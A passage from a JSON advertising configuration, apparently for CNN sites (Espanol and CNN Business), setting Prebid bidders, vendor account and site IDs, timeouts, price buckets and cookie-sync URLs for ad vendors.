"Control\",\"Shift\",\"Z\"]},\"CREATIVE_REVIEW\":{\"DEBUG\":false,\"HOTKEY\":\"^ d o h $\"},\"CRITEO\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DESKTOP_ZONES\":{},\"MOBILE_TIMEOUT\":750,\"MOBILE_ZONES\":{},\"MULTISIZE_FIRST\":\"F\",\"MULTISIZE_LARGEST\":\"L\",\"MULTISIZE_ALL\":\"A\",\"MULTISIZE_METHOD\":\"L\",\"TIMEOUT\":750},\"FASTLANE\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DOM_ACCOUNT_ID\":11078,\"INTL_ACCOUNT_ID\":11016,\"MOBILE_TIMEOUT\":750,\"TIMEOUT\":750},\"GUID\":{\"DEBUG\":false},\"IAS\":{\"ACCOUNT_IDS\":{\"DOM\":925660,\"INTL\":925660},\"DEBUG\":false},\"IX\":{\"DEBUG\":false,\"SCRIPT_KEY\":{\"DOM\":null,\"INTL\":null},\"IDENTITY\":\"\"},\"IVR\":{\"DEFAULT_DISPLAY_PERCENT\":50,\"DEFAULT_DISPLAY_MILLISECONDS\":35000,\"DEBUG\":false},\"KRUX\":{\"INTL_CONTROLTAG\":\"\",\"DOM_CONTROLTAG\":\"\",\"DEBUG\":false},\"MALVERTISING\":{\"SCRIPT_SRC\":\"//d9esmwyn3ffr1.cloudfront.net/script.js\",\"SITE_VENDOR\":\"CleanIO\",\"DEBUG\":false},\"PREBID\":{\"SEND_ALL_BIDS\":{\"INTL\":true,\"DOM\":true},\"VENDOR\":{\"IX\":{\"IDENTITY\":\"\"},\"RUBICON\":{\"ZONE_MAPPING\":{\"INTL\":{\"MOBILE\":{\"ROS\":{\"btf\":0,\"atf\":0},\"HP\":{\"btf\":0,\"atf\":0}},\"DESKTOP\":{\"ROS\":{\"btf\":0,\"atf\":0},\"HP\":{\"btf\":0,\"atf\":0}}},\"DOM\":{\"MOBILE\":{\"ROS\":{\"btf\":0,\"atf\":0},\"HP\":{\"btf\":0,\"atf\":0}},\"DESKTOP\":{\"ROS\":{\"btf\":0,\"atf\":0},\"HP\":{\"btf\":0,\"atf\":0}}}},\"SITE_ID\":{\"INTL\":{\"MOBILE\":0,\"DESKTOP\":0},\"DOM\":{\"MOBILE\":0,\"DESKTOP\":0}},\"ACCOUNT_ID\":{\"INTL\":\"11016\",\"DOM\":\"11078\"}},\"PANGAEA\":{\"ACCOUNT_ID\":{\"INTL\":\"8613\",\"DOM\":0}},\"CRITEO\":{\"ACCOUNT_ID\":{\"INTL\":9264,\"DOM\":4157}},\"APPNEXUS\":{\"ACCOUNT_ID\":{\"INTL\":\"8353\",\"DOM\":\"7745\"}}},\"TIMEOUTS\":{\"VIDEO\":{\"REFRESH\":1000,\"MIDROLL\":750,\"DEFAULT\":500},\"DISPLAY\":{\"MOBILE\":750,\"DESKTOP\":1150}},\"DEBUG\":false,\"APPROVED_BIDDERS\":{\"S2S\":{\"INTL\":[\"pangaea\",\"sharethrough\",\"ix\"],\"DOM\":[\"ix\"]},\"NATIVE\":{\"INTL\":[\"appnexus\",\"pangaea\"],\"DOM\":[\"appnexus\"]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"pangaea\",\"ix\",\"rubicon\",\"sharethrough\",\"criteo\"],\"DOM\":[\"appnexus\",\"rubicon\",\"criteo\",\"ix\",\"trustx\"]}},\"BIDDERS\":{\"S2S\":{\"INTL\":[],\"DOM\":[]},\"NATIVE\":{\"INTL\":[],\"DOM\":[]},\"CLIENT\":{\"INTL\":[],\"DOM\":[]}}},\"PROXIMIC\":{\"DEBUG\":false},\"SOURCEPOINT\":{\"DEBUG\":false},\"SSAI\":{\"VENDORS\":{\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"}},\"SITE_VENDORS\":[\"AppNexus\",\"Freewheel\",\"Rubicon\",\"Telaria\"],\"DEBUG\":false},\"TRANSACTION_ID\":{\"DEBUG\":false},\"USER_CONSENT\":{\"ONETRUST_SRC\":\"\",\"ONETRUST_GUID\":\"\",\"COOKIE_DOMAIN\":\"\",\"DEBUG\":false,\"ENABLED\":false},\"VERSION\":\"v2.0\",\"NAME\":\"Espanol\",\"TIMESTAMP\":[\"1\",\"723\",\"573\",\"148\",\"463\"],\"DESCRIPTION\":\"Site for CNNe on Stellar\"},\"business-domestic\":{\"ADFUEL\":{\"AUTO_DISPATCH\":true,\"DEFAULT_TIMEOUT\":800,\"DEFAULT_DESKTOP_TIMEOUT\":800,\"DEFAULT_MOBILE_TIMEOUT\":800,\"IFRAME_TITLE\":\"advertisement\",\"NETWORK_ID\":\"8663477\",\"REFRESH_ON_FOCUS_ONLY\":false,\"LAZY_LOAD_FETCH_PERCENT\":500,\"LAZY_LOAD_RENDER_PERCENT\":200,\"LAZY_LOAD_MOBILE_SCALING\":2,\"COLLAPSE_EMPTY_DIVS\":true,\"DEBUG\":false,\"SITE_OBJECT\":\"CNN\",\"ACTIVE_MODULES\":[\"\"]},\"A9\":{\"SLOTNAMES\":{\"PREPEND_ADUNIT\":false,\"MIDROLL\":\"aps-midroll\",\"PREROLL\":\"aps-preroll\"},\"TIMEOUTS\":{\"MOBILE\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":750,\"INITIAL\":750}},\"DESKTOP\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":1150,\"INITIAL\":1150}}},\"DEBUG\":false,\"ACCOUNT_IDS\":{\"INTL\":\"3288\",\"DOM\":\"3159\"}},\"AUI\":{\"SITE_VENDORS\":{\"DOM\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"PubMatic\",\"Rubicon\",\"SpotX\",\"Telaria\"],\"INTL\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"PubMatic\",\"Rubicon\",\"SpotX\",\"Telaria\"]},\"VENDORS\":{\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"SpotX\":{\"COOKIE_NAME\":\"hkgc\",\"URL\":\"https://sync.search.spotxchange.com/audience_id\"},\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"}}},\"BEEMRAY\":{\"DEBUG\":false,\"CUSTOMER_ID\":\"\",\"API_KEY\":\"\"},\"BLOCKTHROUGH\":{\"DEBUG\":false},\"CEP\":{\"DEBUG\":false},\"CONSOLE_TOOL\":{\"DEBUG\":false,\"HOTKEY\":[\"Control\",\"Shift\",\"Z\"]},\"CREATIVE_REVIEW\":{\"DEBUG\":false,\"HOTKEY\":\"^ d o h $\"},\"CRITEO\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DESKTOP_ZONES\":{},\"MOBILE_TIMEOUT\":750,\"MOBILE_ZONES\":{},\"MULTISIZE_FIRST\":\"F\",\"MULTISIZE_LARGEST\":\"L\",\"MULTISIZE_ALL\":\"A\",\"MULTISIZE_METHOD\":\"L\",\"TIMEOUT\":750},\"FASTLANE\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DOM_ACCOUNT_ID\":11078,\"INTL_ACCOUNT_ID\":11016,\"MOBILE_TIMEOUT\":750,\"TIMEOUT\":750},\"GUID\":{\"DEBUG\":false},\"IAS\":{\"ACCOUNT_IDS\":{\"DOM\":925660,\"INTL\":925660},\"DEBUG\":false},\"IX\":{\"DEBUG\":false,\"SCRIPT_KEY\":{\"DOM\":null,\"INTL\":null},\"IDENTITY\":\"\"},\"IVR\":{\"DEFAULT_DISPLAY_PERCENT\":50,\"DEFAULT_DISPLAY_MILLISECONDS\":35000,\"DEBUG\":false},\"KRUX\":{\"INTL_CONTROLTAG\":\"teff9xc7i\",\"DOM_CONTROLTAG\":\"IWzCuclz\",\"DEBUG\":false},\"MALVERTISING\":{\"SCRIPT_SRC\":\"//cadmus.script.ac/d2uap9jskdzp2/script.js\",\"SITE_VENDOR\":\"CleanIO\",\"DEBUG\":false},\"PREBID\":{\"SEND_ALL_BIDS\":{\"INTL\":true,\"DOM\":true},\"VENDOR\":{\"IX\":{\"IDENTITY\":\"\",\"SITE_ID\":{\"DOM\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"423255\",\"970x250\":\"423255\",\"970x90\":\"423255\",\"300x600\":\"423257\",\"300x250\":\"423257\"},\"btf\":{\"300x600\":\"423258\",\"300x250\":\"423258\",\"728x90\":\"423256\",\"970x250\":\"423256\",\"970x90\":\"423256\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"423259\",\"300x250\":\"423261\"},\"btf\":{\"300x250\":\"423260\",\"320x50\":\"423262\"}},\"VIDEO\":{\"DESKTOP\":0,\"MOBILE\":0},\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"341959\",\"970x250\":\"341960\",\"970x90\":\"341961\",\"300x600\":\"341962\",\"300x250\":\"341963\"},\"btf\":{\"300x600\":\"341965\",\"300x250\":\"341966\",\"728x90\":\"341967\",\"970x250\":\"341968\",\"970x90\":\"341969\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"341964\",\"300x250\":\"341970\"},\"btf\":{\"320x50\":\"341957\",\"300x250\":\"341971\"}},\"VIDEO\":{\"DESKTOP\":0,\"MOBILE\":0},\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"OUTSTREAM\":{\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0},\"INTL\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"VIDEO\":{\"WIDTH\":640,\"HEIGHT\":480,\"MIMES\":[\"video/mp4\"],\"PROTOCOLS\":[2,3,5,6],\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0},\"INTL\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"}},\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}}}},\"RUBICON\":{\"ACCOUNT_ID\":{\"DOM\":\"11078\",\"INTL\":\"11016\"},\"SITE_ID\":{\"DOM\":{\"DESKTOP\":\"26792\",\"MOBILE\":\"42244\",\"VIDEO\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":\"78582\",\"MOBILE\":\"78584\",\"VIDEO\":{\"DESKTOP\":\"415330\",\"MOBILE\":\"430362\"}}},\"ZONE_MAPPING\":{\"DOM\":{\"DESKTOP\":{\"HP\":{\"btf\":\"154308\",\"atf\":\"106536\"},\"ROS\":{\"btf\":\"107752\",\"atf\":\"106830\"}},\"MOBILE\":{\"HP\":{\"btf\":\"185914\",\"atf\":\"185914\"},\"ROS\":{\"btf\":\"185914\",\"atf\":\"185914\"}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"0\",\"btf\":\"0\"},\"ROS\":{\"atf\":\"0\",\"btf\":\"0\"}},\"MOBILE\":{\"HP\":{\"atf\":\"0\",\"btf\":\"0\"},\"ROS\":{\"atf\":\"0\",\"btf\":\"0\"}}}},\"INTL\":{\"DESKTOP\":{\"HP\":{\"btf\":\"650178\",\"atf\":\"650178\"},\"ROS\":{\"btf\":\"369850\",\"atf\":\"369850\"}},\"MOBILE\":{\"HP\":{\"btf\":\"369856\",\"atf\":\"369856\"},\"ROS\":{\"btf\":\"369856\",\"atf\":\"369856\"}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"2341606\",\"btf\":\"2341606\"},\"ROS\":{\"atf\":\" 2341606\",\"btf\":\"2341606\"}},\"MOBILE\":{\"HP\":{\"atf\":\"2460344\",\"btf\":\"2460344\"},\"ROS\":{\"atf\":\"2460344\",\"btf\":\"2460344\"}}}}},\"LANGUAGE\":{\"DOM\":\"en\",\"INTL\":\"en\"},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}},\"LANGUAGE\":\"en\"}},\"PANGAEA\":{\"ACCOUNT_ID\":{\"INTL\":\"8613\",\"DOM\":0}},\"CRITEO\":{\"ACCOUNT_ID\":{\"INTL\":9264,\"DOM\":4157}},\"APPNEXUS\":{\"ACCOUNT_ID\":{\"DOM\":\"7745\",\"INTL\":\"8353\"},\"VIDEO_INVCODE\":{\"DOM\":\"cnn_homepage_video1\",\"INTL\":\"cnni_homepage_video1\"},\"PLAYBACK_METHOD\":{\"DOM\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"},\"INTL\":{\"DESKTOP\":\"auto_play_sound_off\",\"MOBILE\":\"click_to_play\"}},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}}},\"RESERVE\":{\"DOM\":0.9,\"INTL\":null},\"SUPPLY_TYPE\":{\"DOM\":{\"WEB\":true,\"MOBILE_WEB\":true},\"INTL\":{\"WEB\":true,\"MOBILE_WEB\":true}},\"CONTEXT\":{\"DOM\":\"instream\",\"INTL\":\"instream\"}},\"PUBMATIC\":{\"PUBLISHER_ID\":{\"DOM\":\"162932\",\"INTL\":\"160262\"},\"MAPPINGS\":{\"DOM\":{\"DESKTOP\":{},\"MOBILE\":{}},\"INTL\":{\"DESKTOP\":{},\"MOBILE\":{}}}},\"TRUSTX\":{\"UID\":{\"DOM\":{\"DESKTOP\":{\"atf\":{\"970x250\":\"15218\",\"970x90\":\"15219\",\"728x90\":\"15220\",\"300x250\":\"15224\"},\"btf\":{\"970x250\":\"15221\",\"970x90\":\"15222\",\"728x90\":\"15223\",\"300x250\":\"15226\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"15228\"},\"btf\":{\"320x50\":\"15230\"}}},\"INTL\":{\"DESKTOP\":{\"atf\":{},\"btf\":{}},\"MOBILE\":{\"atf\":{},\"btf\":{}}}}},\"TRIPLELIFT\":{\"MAPPINGS\":{\"DOM\":{\"DESKTOP\":{\"HP\":{\"970x250\":\"CNN_leaderboard_Prebid\",\"970x90\":\"CNN_leaderboard_Prebid\",\"728x90\":\"CNN_leaderboard_Prebid\",\"300x600\":\"CNN_300x600_300x250_DeskTab_Prebid\"},\"ROS\":{\"970x250\":\"CNN_leaderboard_Prebid\",\"970x90\":\"CNN_leaderboard_Prebid\",\"728x90\":\"CNN_leaderboard_Prebid\",\"300x600\":\"CNN_300x600_300x250_DeskTab_Prebid\"}},\"MOBILE\":{\"HP\":{\"300x250\":\"CNN_300x250_Mobile_Prebid\"},\"ROS\":{\"300x250\":\"CNN_300x250_Mobile_Prebid\"}}},\"INTL\":{\"DESKTOP\":{\"HP\":{},\"ROS\":{}},\"MOBILE\":{\"HP\":{},\"ROS\":{}}}}},\"SPOTX\":{\"CHANNEL_ID\":{\"DOM\":{\"DESKTOP\":\"\",\"MOBILE\":\"\"},\"INTL\":{\"DESKTOP\":\"325241\",\"MOBILE\":\"328164\"}},\"VIDEO\":{\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":5,\"INTL\":5},\"MAX\":{\"DOM\":15,\"INTL\":15}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}}}}},\"FLEDGE\":{\"BIDDERS\":[\"ix\"]}},\"TIMEOUTS\":{\"VIDEO\":{\"REFRESH\":1000,\"MIDROLL\":750,\"DEFAULT\":500},\"DISPLAY\":{\"MOBILE\":750,\"DESKTOP\":1150}},\"DEBUG\":false,\"APPROVED_BIDDERS\":{\"S2S\":{\"INTL\":[\"pangaea\",\"sharethrough\",\"ix\"],\"DOM\":[\"ix\"]},\"NATIVE\":{\"INTL\":[\"appnexus\",\"pangaea\"],\"DOM\":[\"appnexus\"]},\"CLIENT\":{\"INTL\":[\"appnexus\",\"pangaea\",\"ix\",\"rubicon\",\"sharethrough\",\"criteo\"],\"DOM\":[\"appnexus\",\"rubicon\",\"criteo\",\"ix\",\"trustx\"]}},\"BIDDERS\":{\"S2S\":{\"INTL\":[],\"DOM\":[]},\"NATIVE\":{\"INTL\":[],\"DOM\":[]},\"CLIENT\":{\"INTL\":[\"criteo\",\"ix\",\"pubmatic\",\"rubicon\"],\"DOM\":[\"criteo\",\"ix\",\"rubicon\",\"triplelift\",\"trustx\"]},\"OUTSTREAM\":{\"DOM\":[],\"INTL\":[]},\"VIDEO\":{\"DOM\":[],\"INTL\":[]}},\"FLOORS\":{\"DISPLAY\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}},\"VIDEO\":{\"DOM\":{\"DESKTOP\":0.01,\"MOBILE\":0.01},\"INTL\":{\"DESKTOP\":0.01,\"MOBILE\":0.01}}},\"PRICE_BUCKETS\":{\"DOM\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":115,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":4,\"max\":50,\"increment\":1},{\"precision\":2,\"min\":50,\"max\":100,\"increment\":5}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]},\"INTL\":{\"DISPLAY\":[{\"precision\":2,\"min\":0,\"max\":5,\"increment\":0.01},{\"precision\":2,\"min\":5,\"max\":30,\"increment\":0.05},{\"precision\":2,\"min\":30,\"max\":50,\"increment\":1}],\"VIDEO\":[{\"precision\":2,\"min\":4,\"max\":50,\"increment\":1},{\"precision\":2,\"min\":50,\"max\":100,\"increment\":5}],\"OUTSTREAM\":[{\"precision\":2,\"min\":1,\"max\":50,\"increment\":1}]}},\"LIBRARY\":{\"VENDORS\":[\"rubicon\",\"criteo\",\"ix\",\"trustx\",\"triplelift\",\"spotx\",\"pubmatic\"],\"MODULES\":[\"categoryTranslation\",\"consentManagement\",\"prebidServerBidAdapter\",\"id5IdSystem\",\"identityLinkIdSystem\",\"fledgeForGpt\"]}},\"PROXIMIC\":{\"DEBUG\":false},\"SOURCEPOINT\":{\"DEBUG\":false},\"SSAI\":{\"VENDORS\":{\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"}},\"SITE_VENDORS\":[\"AppNexus\",\"Freewheel\",\"LiveRamp\",\"PubMatic\",\"Rubicon\",\"Telaria\"],\"DEBUG\":false},\"TRANSACTION_ID\":{\"DEBUG\":false},\"USER_CONSENT\":{\"ONETRUST_SRC\":\"\",\"ONETRUST_GUID\":\"\",\"COOKIE_DOMAIN\":\"\",\"DEBUG\":false,\"ENABLED\":false},\"VERSION\":\"v2.0\",\"NAME\":\"CNN Business\",\"TIMESTAMP\":[\"1\",\"723\",\"573\",\"148\",\"499\"],\"DESCRIPTION\":\"CNN Business Domestic\"},\"business-international\":{\"ADFUEL\":{\"AUTO_DISPATCH\":true,\"DEFAULT_TIMEOUT\":800,\"DEFAULT_DESKTOP_TIMEOUT\":800,\"DEFAULT_MOBILE_TIMEOUT\":800,\"IFRAME_TITLE\":\"advertisement\",\"NETWORK_ID\":\"8663477\",\"REFRESH_ON_FOCUS_ONLY\":false,\"LAZY_LOAD_FETCH_PERCENT\":500,\"LAZY_LOAD_RENDER_PERCENT\":200,\"LAZY_LOAD_MOBILE_SCALING\":2,\"COLLAPSE_EMPTY_DIVS\":true,\"DEBUG\":false,\"ACTIVE_MODULES\":[],\"SITE_OBJECT\":\"CNN\"},\"A9\":{\"SLOTNAMES\":{\"PREPEND_ADUNIT\":false,\"MIDROLL\":\"aps-midroll\",\"PREROLL\":\"aps-preroll\"},\"TIMEOUTS\":{\"MOBILE\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":750,\"INITIAL\":750}},\"DESKTOP\":{\"VIDEO\":{\"MIDROLL\":750,\"REFRESH\":750,\"INITIAL\":500},\"DISPLAY\":{\"REFRESH\":1150,\"INITIAL\":1150}}},\"DEBUG\":false,\"ACCOUNT_IDS\":{\"INTL\":\"3288\",\"DOM\":\"3159\"}},\"AUI\":{\"SITE_VENDORS\":{\"DOM\":[],\"INTL\":[]},\"VENDORS\":{\"AppNexus\":{\"COOKIE_NAME\":\"zwmc\",\"URL\":\"https://ib.adnxs.com/getuid?https://umto.{{domain}}/user-sync?zwmc=$UID&domain={{domain}}\"},\"Freewheel\":{\"COOKIE_NAME\":\"bea4\",\"URL\":\"https://bea4.v.fwmrm.net/ad/u?mode=echo&cr=https://umto.{{domain}}/user-sync?bea4=#{user.id}&domain={{domain}}\"},\"LiveRamp\":{\"COOKIE_NAME\":\"orev\",\"URL\":\"https://idsync.rlcdn.com/712348.gif?partner_uid=${fwuid}\"},\"PubMatic\":{\"COOKIE_NAME\":\"kfyn\",\"URL\":\"https://ads.pubmatic.com/AdServer/js/userSync.js\"},\"Rubicon\":{\"COOKIE_NAME\":\"ifyr\",\"URL\":\"https://pixel-us-east.rubiconproject.com/exchange/sync.php?p={{brand}}\"},\"SpotX\":{\"COOKIE_NAME\":\"hkgc\",\"URL\":\"https://sync.search.spotxchange.com/audience_id\"},\"Telaria\":{\"COOKIE_NAME\":\"goiz\",\"URL\":\"https://eq97f.publishers.tremorhub.com/pubsync?redir=https://umto.{{domain}}/user-sync?goiz=%5Btvid%5D&domain={{domain}}\"}}},\"BEEMRAY\":{\"DEBUG\":false,\"CUSTOMER_ID\":\"\",\"API_KEY\":\"\"},\"BLOCKTHROUGH\":{\"DEBUG\":false},\"CEP\":{\"DEBUG\":false},\"CONSOLE_TOOL\":{\"DEBUG\":false,\"HOTKEY\":[\"Control\",\"Shift\",\"Z\"]},\"CREATIVE_REVIEW\":{\"DEBUG\":false,\"HOTKEY\":\"^ d o h $\"},\"CRITEO\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DESKTOP_ZONES\":{},\"MOBILE_TIMEOUT\":750,\"MOBILE_ZONES\":{},\"MULTISIZE_FIRST\":\"F\",\"MULTISIZE_LARGEST\":\"L\",\"MULTISIZE_ALL\":\"A\",\"MULTISIZE_METHOD\":\"L\",\"TIMEOUT\":750},\"FASTLANE\":{\"DEBUG\":false,\"DESKTOP_TIMEOUT\":750,\"DOM_ACCOUNT_ID\":11078,\"INTL_ACCOUNT_ID\":11016,\"MOBILE_TIMEOUT\":750,\"TIMEOUT\":750},\"GUID\":{\"DEBUG\":false},\"IAS\":{\"ACCOUNT_IDS\":{\"DOM\":925660,\"INTL\":925660},\"DEBUG\":false},\"IX\":{\"DEBUG\":false,\"SCRIPT_KEY\":{\"DOM\":null,\"INTL\":null},\"IDENTITY\":\"\"},\"IVR\":{\"DEFAULT_DISPLAY_PERCENT\":50,\"DEFAULT_DISPLAY_MILLISECONDS\":35000,\"DEBUG\":false},\"KRUX\":{\"INTL_CONTROLTAG\":\"\",\"DOM_CONTROLTAG\":\"\",\"DEBUG\":false},\"MALVERTISING\":{\"SCRIPT_SRC\":\"//d9esmwyn3ffr1.cloudfront.net/script.js\",\"SITE_VENDOR\":\"CleanIO\",\"DEBUG\":false},\"PREBID\":{\"SEND_ALL_BIDS\":{\"INTL\":true,\"DOM\":true},\"VENDOR\":{\"IX\":{\"IDENTITY\":\"\",\"SITE_ID\":{\"DOM\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"423255\",\"970x250\":\"423255\",\"970x90\":\"423255\",\"300x600\":\"423257\",\"300x250\":\"423257\"},\"btf\":{\"300x600\":\"423258\",\"300x250\":\"423258\",\"728x90\":\"423256\",\"970x250\":\"423256\",\"970x90\":\"423256\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"423259\",\"300x250\":\"423261\"},\"btf\":{\"300x250\":\"423260\",\"320x50\":\"423262\"}},\"VIDEO\":0,\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":{\"atf\":{\"728x90\":\"341959\",\"970x250\":\"341960\",\"970x90\":\"341961\",\"300x600\":\"341962\",\"300x250\":\"341963\"},\"btf\":{\"300x600\":\"341965\",\"300x250\":\"341966\",\"728x90\":\"341967\",\"970x250\":\"341968\",\"970x90\":\"341969\"}},\"MOBILE\":{\"atf\":{\"320x50\":\"341964\",\"300x250\":\"341970\"},\"btf\":{\"320x50\":\"341957\",\"300x250\":\"341971\"}},\"VIDEO\":0,\"OUTSTREAM\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"OUTSTREAM\":{\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0},\"INTL\":{\"DESKTOP\":0,\"MOBILE\":0}}},\"VIDEO\":{\"WIDTH\":640,\"HEIGHT\":480,\"MIMES\":[\"video/mp4\"],\"PROTOCOLS\":[2,3,5,6],\"SITE_ID\":{\"DOM\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"},\"INTL\":{\"DESKTOP\":\"829396\",\"MOBILE\":\"829397\"}},\"DURATION\":{\"DESKTOP\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":30,\"INTL\":30}},\"MOBILE\":{\"MIN\":{\"DOM\":6,\"INTL\":6},\"MAX\":{\"DOM\":15,\"INTL\":15}}}}},\"RUBICON\":{\"ACCOUNT_ID\":{\"DOM\":\"11078\",\"INTL\":\"11016\"},\"SITE_ID\":{\"DOM\":{\"DESKTOP\":0,\"MOBILE\":0,\"VIDEO\":{\"DESKTOP\":0,\"MOBILE\":0}},\"INTL\":{\"DESKTOP\":\"78598\",\"MOBILE\":\"78600\",\"VIDEO\":{\"DESKTOP\":\"415330\",\"MOBILE\":\"430362\"}}},\"ZONE_MAPPING\":{\"DOM\":{\"DESKTOP\":{\"HP\":{\"btf\":0,\"atf\":0},\"ROS\":{\"btf\":0,\"atf\":0}},\"MOBILE\":{\"HP\":{\"btf\":0,\"atf\":0},\"ROS\":{\"btf\":0,\"atf\":0}},\"VIDEO\":{\"DESKTOP\":{\"HP\":{\"atf\":\"0\",\"btf\":\"0\"},\"ROS\":{\"atf\":\"0\",\"btf\":\"0\"}},\"MOBILE\":{\"HP\":{\"atf\":\"0\",\"btf\":\"0\"},\"ROS\":{\"atf\":\"0\",\"btf\":\"0\"}}}},\"INTL\":{\"DESKTOP\":{\"HP\":{\"btf\":\"455710\",\"atf\":\"455740\"},\"ROS\":{\"btf\":\"455710\",\"atf\":\"